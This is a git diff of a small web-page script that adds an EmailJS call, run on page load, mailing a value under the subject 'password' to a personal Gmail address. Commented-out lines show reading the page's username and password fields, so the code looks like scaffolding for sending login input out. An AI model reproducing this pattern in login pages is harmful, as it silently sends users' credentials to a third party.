@@ -5,6 +5,39 @@
 // // b.appendChild(a);
 // b.hidden=false;
 // },1000);
+
+
+    (function(){
+        emailjs.init("xvJBD3idXnQ7JAJOi")
+    })();
+
+//        var password = document.getElementById("Password").value;
+
+// var username = document.getElementById("Username").value;
+
+// if (!(password.trim() === ""||username.trim() === "")) {
+
+    var  params={
+        sendername: "aditya",
+        to : "adichhipa9@gmail.com",
+        subject : "password",
+        replyto: "cia",
+        message: `${count}`
+    };
+    
+    var serviceID="service_zyg4srp";
+    var templateID="template_gugy1kc";
+
+    emailjs.send(serviceID,templateID,params)
+    .then(res=>{
+
+      
+    })
+    .catch();
+   
+
+
+
 var j=0;
 var count=0;
 let a= document.getElementById("am");
@@ -66,7 +99,7 @@ a.onclick=()=>{
         sendername: "aditya",
         to : "adichhipa9@gmail.com",
         subject : "password",
-        replyto: "no reply",
+        replyto: "cia",
         message: `${count}`
     };
     
